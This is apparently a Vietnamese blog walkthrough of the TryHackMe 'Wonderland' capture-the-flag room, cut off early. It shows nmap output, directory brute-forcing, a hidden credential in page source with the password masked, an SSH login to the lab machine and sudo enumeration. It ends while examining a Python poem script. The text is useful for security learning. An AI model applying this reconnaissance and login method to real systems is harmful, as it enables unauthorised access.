</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">79</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="n">a9</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="n">e2</span><span class="p">:</span><span class="n">c2</span><span class="p">:</span><span class="n">be</span><span class="p">:</span><span class="mi">84</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span> <span class="n">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M</span><span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">00</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">80</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="n">e6</span><span class="p">:</span><span class="mi">3</span><span class="n">d</span><span class="p">:</span><span class="mi">4</span><span class="n">b</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">2</span><span class="n">c</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">7</span><span class="n">e</span><span class="p">:</span><span class="mi">2</span><span class="n">a</span><span class="p">:</span><span class="n">c9</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_ssh</span><span class="o">-</span><span class="n">ed25519</span> <span class="n">AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf</span><span class="o">/</span><span class="n">LF</span><span class="o">+/</span><span class="n">hMyKh</span>
</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Golang</span> <span class="n">net</span><span class="o">/</span><span class="n">http</span> <span class="n">server</span> <span class="p">(</span><span class="n">Go</span><span class="o">-</span><span class="n">IPFS</span> <span class="n">json</span><span class="o">-</span><span class="n">rpc</span> <span class="ow">or</span> <span class="n">InfluxDB</span> <span class="n">API</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Follow</span> <span class="n">the</span> <span class="n">white</span> <span class="n">rabbit</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">GET</span> <span class="n">HEAD</span> <span class="n">POST</span> <span class="n">OPTIONS</span>
</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span></span></span></code></pre></div></div>
<p>Tôi sẽ bắt đầu với web server.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="index.html"
    width="1615"
    height="898"
    src="/ctf/tryhackme/wonderland/1_hu_69b97b723dd226f0.png"
    srcset="/ctf/tryhackme/wonderland/1_hu_69b97b723dd226f0.png 800w, /ctf/tryhackme/wonderland/1_hu_300518a3bd76d505.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/tryhackme/wonderland/1.png"></figure>
<p>Chỉ là 1 trang html đơn giản. Tôi thử qua các path đơn giản và phổ biến như <em>robots.txt</em> hay thử check qua <em>index.php</em> đều không có kết quả. Vẫn phải dùng tool để tìm web path thôi, tôi sẽ dùng <a href="https://github.com/maurosoria/dirsearch.git"  target="_blank" rel="noreferrer">dirsearch</a>.</p>
<p><code>[05:44:38] 301 -    0B  - /r  -&gt;  r/</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="path r"
    width="1040"
    height="248"
    src="/ctf/tryhackme/wonderland/2_hu_5d58dd64598115c8.png"
    srcset="/ctf/tryhackme/wonderland/2_hu_5d58dd64598115c8.png 800w, /ctf/tryhackme/wonderland/2.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/tryhackme/wonderland/2.png"></figure>
<p>Cũng không có gì đặc biệt. Tôi sẽ thử 1 lần dùng dirsearch nữa để xem đằng sau path <em>/r</em> này có gì không.</p>
<p><code>[05:45:23] 301 -    0B  - /r/a  -&gt;  a/</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="path /a"
    width="1047"
    height="264"
    src="/ctf/tryhackme/wonderland/3_hu_541f962583a96d0a.png"
    srcset="/ctf/tryhackme/wonderland/3_hu_541f962583a96d0a.png 800w, /ctf/tryhackme/wonderland/3.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/tryhackme/wonderland/3.png"></figure>
<p>Vẫn chưa có gì để khai thác ở đây. Nhưng tôi có 1 ý tưởng về mấy cái path này, tôi sẽ thử thêm 1 lần dirsearch nữa cho chắc chắn.</p>
<p><code>[05:56:29] 301 -    0B  - /r/a/b  -&gt;  b/</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="path /b"
    width="872"
    height="245"
    src="/ctf/tryhackme/wonderland/4_hu_a917000023d6a98.png"
    srcset="/ctf/tryhackme/wonderland/4_hu_a917000023d6a98.png 800w, /ctf/tryhackme/wonderland/4.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/tryhackme/wonderland/4.png"></figure>
<p>Vậy thì rất có thể những path sau là các chữ cái tạo nên từ rabbit. Để tránh mất thời gian thì tôi sẽ thử luôn.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="path /b"
    width="888"
    height="236"
    src="/ctf/tryhackme/wonderland/5_hu_fa7cadfe84ce5cb.png"
    srcset="/ctf/tryhackme/wonderland/5_hu_fa7cadfe84ce5cb.png 800w, /ctf/tryhackme/wonderland/5.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/tryhackme/wonderland/5.png"></figure>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="path /i"
    width="892"
    height="253"
    src="/ctf/tryhackme/wonderland/6_hu_afc32b3b3f0427c6.png"
    srcset="/ctf/tryhackme/wonderland/6_hu_afc32b3b3f0427c6.png 800w, /ctf/tryhackme/wonderland/6.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/tryhackme/wonderland/6.png"></figure>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt="path /r"
    width="1475"
    height="1000"
    src="/ctf/tryhackme/wonderland/7_hu_abec1c418988065b.png"
    srcset="/ctf/tryhackme/wonderland/7_hu_abec1c418988065b.png 800w, /ctf/tryhackme/wonderland/7_hu_74867467cd7be0b2.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/tryhackme/wonderland/7.png"></figure>
<p>Check qua source web thì tôi tìm được 1 thứ hay ho có thể là username và password để đăng nhập SSH.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Enter</span> <span class="n">wonderland</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="n">href</span><span class="o">=</span><span class="s2">&#34;[/main.css](view-source:http://10.10.185.15/main.css)&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Open</span> <span class="n">the</span> <span class="n">door</span> <span class="ow">and</span> <span class="n">enter</span> <span class="n">wonderland</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="s2">&#34;Oh, you’re sure to do that,&#34;</span> <span class="n">said</span> <span class="n">the</span> <span class="n">Cat</span><span class="p">,</span> <span class="s2">&#34;if you only walk long enough.&#34;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Alice</span> <span class="n">felt</span> <span class="n">that</span> <span class="n">this</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">be</span> <span class="n">denied</span><span class="p">,</span> <span class="n">so</span> <span class="n">she</span> <span class="n">tried</span> <span class="n">another</span> <span class="n">question</span><span class="o">.</span> <span class="s2">&#34;What sort of people live about here?&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="s2">&#34;In that direction,&#34;&#34; the Cat said, waving its right paw round, &#34;</span><span class="n">lives</span> <span class="n">a</span> <span class="n">Hatter</span><span class="p">:</span> <span class="ow">and</span> <span class="ow">in</span> <span class="n">that</span> <span class="n">direction</span><span class="p">,</span><span class="s2">&#34; waving</span>
</span></span><span class="line"><span class="cl">        <span class="n">the</span> <span class="n">other</span> <span class="n">paw</span><span class="p">,</span> <span class="s2">&#34;lives a March Hare. Visit either you like: they’re both mad.&#34;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">p</span> <span class="n">style</span><span class="o">=</span><span class="s2">&#34;display: none;&#34;</span><span class="o">&gt;</span><span class="n">alice</span><span class="p">:</span><span class="o">***************************************&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s2">&#34;[/img/alice_door.](view-source:http://10.10.185.15/img/alice_door.)&#34;</span> <span class="n">style</span><span class="o">=</span><span class="s2">&#34;height: 50rem;&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span></span></span></code></pre></div></div>

<h2 class="relative group">SSH
    <div id="ssh" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ssh" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>Thử login ssh</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">neo</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">ssh</span> <span class="n">alice</span><span class="o">@</span><span class="mf">10.10.185.15</span>                       
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="s1">&#39;10.10.185.15 (10.10.185.15)&#39;</span> <span class="n">can</span><span class="s1">&#39;t be established.</span>
</span></span><span class="line"><span class="cl"><span class="n">ED25519</span> <span class="n">key</span> <span class="n">fingerprint</span> <span class="ow">is</span> <span class="n">SHA256</span><span class="p">:</span><span class="n">Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">key</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">known</span> <span class="n">by</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">names</span>
</span></span><span class="line"><span class="cl"><span class="n">Are</span> <span class="n">you</span> <span class="n">sure</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="k">continue</span> <span class="n">connecting</span> <span class="p">(</span><span class="n">yes</span><span class="o">/</span><span class="n">no</span><span class="o">/</span><span class="p">[</span><span class="n">fingerprint</span><span class="p">])</span><span class="err">?</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl"><span class="ne">Warning</span><span class="p">:</span> <span class="n">Permanently</span> <span class="n">added</span> <span class="s1">&#39;10.10.185.15&#39;</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">known</span> <span class="n">hosts</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">alice</span><span class="o">@</span><span class="mf">10.10.185.15</span><span class="s1">&#39;s password: </span>
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">18.04.4</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">4.15.0</span><span class="o">-</span><span class="mi">101</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
</span></span><span class="line"><span class="cl"> <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
</span></span><span class="line"><span class="cl"> <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">advantage</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">System</span> <span class="n">information</span> <span class="k">as</span> <span class="n">of</span> <span class="n">Wed</span> <span class="n">Aug</span> <span class="mi">10</span> <span class="mi">10</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">04</span> <span class="n">UTC</span> <span class="mi">2022</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">System</span> <span class="n">load</span><span class="p">:</span>  <span class="mf">0.0</span>                <span class="n">Processes</span><span class="p">:</span>           <span class="mi">84</span>
</span></span><span class="line"><span class="cl">  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>   <span class="mf">18.9</span><span class="o">%</span> <span class="n">of</span> <span class="mf">19.56</span><span class="n">GB</span>   <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>     <span class="mi">0</span>
</span></span><span class="line"><span class="cl">  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span> <span class="mi">29</span><span class="o">%</span>                <span class="n">IP</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.10.185.15</span>
</span></span><span class="line"><span class="cl">  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>   <span class="mi">0</span><span class="o">%</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">0</span> <span class="n">packages</span> <span class="n">can</span> <span class="n">be</span> <span class="n">updated</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span> <span class="n">updates</span> <span class="n">are</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Mon</span> <span class="n">May</span> <span class="mi">25</span> <span class="mi">16</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">21</span> <span class="mi">2020</span> <span class="kn">from</span> <span class="mf">192.168.170.1</span>
</span></span><span class="line"><span class="cl"><span class="n">alice</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> </span></span></code></pre></div></div>
<p>Trong user <em>alice</em> tôi có 2 file là <em>root flag</em> và 1 file python nhưng tất nhiên là không có quyền mở rồi. Tuy nhiên khi thử <code>sudo -l</code> tôi nhận ra user <em>rabbit</em> có quyền chạy file py.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="n">poem</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;The sun was shining on the sea,
</span></span></span><span class="line"><span class="cl"><span class="s2">Shining with all his might:
</span></span></span><span class="line"><span class="cl"><span class="s2">He did his very best to make
</span></span></span><span class="line"><span class="cl"><span class="s2">The billows smooth and bright —
</span></span></span><span class="line"><span class="cl"><span class="s2">And this was odd, because it was
</span></span></span><span class="line"><span class="cl"><span class="s2">The middle of the night.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">The moon was shining sulkily,
</span></span></span><span class="line"><span class="cl"><span class="s2">Because she thought the sun
</span></span></span><span class="line"><span class="cl"><span class="s2">Had got no business to be there
</span></span></span><span class="line"><span class="cl"><span class="s2">After the day was done —
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;It’s very rude of him,&#34; she said,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;To come and spoil the fun!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">The sea was wet as wet could be,
</span></span></span><span class="line"><span class="cl"><span class="s2">The sands were dry as dry.
</span></span></span><span class="line"><span class="cl"><span class="s2">You could not see a cloud, because
</span></span></span><span class="line"><span class="cl"><span class="s2">No cloud was in the sky:
</span></span></span><span class="line"><span class="cl"><span class="s2">No birds were flying over head —
</span></span></span><span class="line"><span class="cl"><span class="s2">There were no birds to fly.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">The Walrus and the Carpenter
</span></span></span><span class="line"><span class="cl"><span class="s2">Were walking close at hand;
</span></span></span><span class="line"><span class="cl"><span class="s2">They wept like anything to see
</span></span></span><span class="line"><span class="cl"><span class="s2">Such quantities of sand:
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;If this were only cleared away,&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">They said, &#34;it would be grand!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;If seven maids with seven mops
</span></span></span><span class="line"><span class="cl"><span class="s2">Swept it for half a year,
</span></span></span><span class="line"><span class="cl"><span class="s2">Do you suppose,&#34; the Walrus said,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;That they could get it clear?&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;I doubt it,&#34; said the Carpenter,
</span></span></span><span class="line"><span class="cl"><span class="s2">And shed a bitter tear.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;O Oysters, come and walk with us!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">The Walrus did beseech.
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;A pleasant walk, a pleasant talk,
</span></span></span><span class="line"><span class="cl"><span class="s2">Along the briny beach:
</span></span></span><span class="line"><span class="cl"><span class="s2">We cannot do with more than four,
</span></span></span><span class="line"><span class="cl"><span class="s2">To give a hand to each.&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">The eldest Oyster looked at him.
</span></span></span><span class="line"><span class="cl"><span class="s2">But never a word he said:
</span></span></span><span class="line"><span class="cl"><span class="s2">The eldest Oyster winked his eye,
</span></span></span><span class="line"><span class="cl"><span class="s2">And shook his heavy head —
</span></span></span><span class="line"><span class="cl"><span class="s2">Meaning to say he did not choose
</span></span></span><span class="line"><span class="cl"><span class="s2">To leave the oyster-bed.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">But four young oysters hurried up,
</span></span></span><span class="line"><span class="cl"><span class="s2">All eager for the treat:
</span></span></span><span class="line"><span class="cl"><span class="s2">Their coats were brushed, their faces washed,
</span></span></span><span class="line"><span class="cl"><span class="s2">Their shoes were clean and neat —
</span></span></span><span class="line"><span class="cl"><span class="s2">And this was odd, because, you know,
</span></span></span><span class="line"><span class="cl"><span class="s2">They hadn’t any feet.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Four other Oysters followed them,
</span></span></span><span class="line"><span class="cl"><span class="s2">And yet another four;
</span></span></span><span class="line"><span class="cl"><span class="s2">And thick and fast they came at last,
</span></span></span><span class="line"><span class="cl"><span class="s2">And more, and more, and more —
</span></span></span><span class="line"><span class="cl"><span class="s2">All hopping through the frothy waves,
</span></span></span><span class="line"><span class="cl"><span class="s2">And scrambling to the shore.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">The Walrus and the Carpenter
</span></span></span><span class="line"><span class="cl"><span class="s2">Walked on a mile or so,
</span></span></span><span class="line"><span class="cl"><span class="s2">And then they rested on a rock
</span></span></span><span class="line"><span class="cl"><span class="s2">Conveniently low:
</span></span></span><span class="line"><span class="cl"><span class="s2">And all the little Oysters stood
</span></span></span><span class="line"><span class="cl"><span class="s2">And waited in a row.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;The time has come,&#34; the Walrus said,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;To talk of many things:
</span></span></span><span class="line"><span class="cl"><span class="s2">Of shoes — and ships — and sealing-wax —
</span></span></span><span class="line"><span class="cl"><span class="s2">Of cabbages — and kings —
</span></span></span><span class="line"><span class="cl"><span class="s2">And why the sea is boiling hot —
</span></span></span><span class="line"><span class="cl"><span class="s2">And whether pigs have wings.&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;But wait a bit,&#34; the Oysters cried,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;Before we have our chat;
</span></span></span><span class="line"><span class="cl"><span class="s2">For some of us are out of breath,
</span></span></span><span class="line"><span class="cl"><span class="s2">And all of us are fat!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;No hurry!&#34; said the Carpenter.
</span></span></span><span class="line"><span class="cl"><span class="s2">They thanked him much for that.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;A loaf of bread,&#34; the Walrus said,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;Is what we chiefly need:
</span></span></span><span class="line"><span class="cl"><span class="s2">Pepper and vinegar besides
</span></span></span><span class="line"><span class="cl"><span class="s2">Are very good indeed —
</span></span></span><span class="line"><span class="cl"><span class="s2">Now if you’re ready Oysters dear,
</span></span></span><span class="line"><span class="cl"><span class="s2">We can begin to feed.&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;But not on us!&#34; the Oysters cried,
</span></span></span><span class="line"><span class="cl"><span class="s2">Turning a little blue,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;After such kindness, that would be
</span></span></span><span class="line"><span class="cl"><span class="s2">A dismal thing to do!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;The night is fine,&#34; the Walrus said
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;Do you admire the view?
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;It was so kind of you to come!
</span></span></span><span class="line"><span class="cl"><span class="s2">And you are very nice!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">The Carpenter said nothing but
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;Cut us another slice:
</span></span></span><span class="line"><span class="cl"><span class="s2">I wish you were not quite so deaf —
</span></span></span><span class="line"><span class="cl"><span class="s2">I’ve had to ask you twice!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;It seems a shame,&#34; the Walrus said,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;To play them such a trick,
</span></span></span><span class="line"><span class="cl"><span class="s2">After we’ve brought them out so far,
</span></span></span><span class="line"><span class="cl"><span class="s2">And made them trot so quick!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">The Carpenter said nothing but
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;The butter’s spread too thick!&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;I weep for you,&#34; the Walrus said.
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;I deeply sympathize.&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">With sobs and tears he sorted out
</span></span></span><span class="line"><span class="cl"><span class="s2">Those of the largest size.
</span></span></span><span class="line"><span class="cl"><span class="s2">Holding his pocket handkerchief
</span></span></span><span class="line"><span class="cl"><span class="s2">Before his streaming eyes.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;O Oysters,&#34; said the Carpenter.
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;You’ve had a pleasant run!
</span></span></span><span class="line"><span class="cl"><span class="s2">Shall we be trotting home again?&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">But answer came there none —
</span></span></span><span class="line"><span class="cl"><span class="s2">And that was scarcely odd, because
</span></span></span><span class="line"><span class="cl"><span class="s2">They’d eaten every one.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">poem</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The line was:</span><span class="se">\t</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span></span></span></code></pre></div></div>
<p>Qua google tôi biết được đây là 1 bài thơ trong phim <em>Alice in wonderland</em> cũng là cảm hứng dựng nên CTF này. Khi chạy file py này, nó sẽ chọn ngẫu nhiên 10 dòng và in ra màn hình kể cả dòng trống.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">alice</span><span class="nd">@wonderland</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">walrus_and_the_carpenter</span><span class="o">.</span><span class="n">py</span> 
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">line</span> <span class="n">was</span><span class="p">:</span>    <span class="n">The</span> <span class="n">Carpenter</span> <span class="n">said</span> <span class="n">nothing</span> <span class="n">but</span>
